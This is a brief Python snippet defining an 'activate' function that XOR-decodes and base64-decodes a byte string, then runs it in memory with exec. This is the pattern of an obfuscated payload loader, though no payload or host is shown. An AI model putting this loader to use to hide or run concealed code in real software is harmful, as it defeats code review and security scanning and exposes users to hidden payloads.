import base64

def activate(data, key):
    source = bytes(v ^ key[i % len(key)] for i, v in enumerate(data))
    source = base64.b64decode(source)
    exec(compile(source, '<memory>', 'exec'))
